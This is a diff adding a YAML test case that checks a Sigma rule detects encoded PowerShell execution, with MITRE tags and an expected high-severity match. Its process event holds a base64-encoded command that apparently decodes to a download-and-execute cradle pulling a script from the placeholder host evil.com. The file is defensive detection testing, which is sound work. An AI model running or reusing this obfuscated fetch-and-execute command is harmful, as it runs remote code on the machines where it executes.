@@ -1,0 +1,19 @@
+test_case:
+  name: "PowerShell Encoded Command Execution"
+  description: "Tests detection of encoded PowerShell commands"
+  rule: "execution/powershell_encoded.yml"
+  rule_type: sigma
+  events:
+    - type: process_create
+      os_type: windows
+      data:
+        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        cmdline: "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
+        parent_path: "C:\\Windows\\System32\\cmd.exe"
+        user: "WORKSTATION\\admin"
+        pid: 7256
+        ppid: 4124
+  expected: match
+  expected_severity: high
+  expected_mitre: ["T1059.001", "T1027"]
+  tags: ["execution", "powershell", "positive"]
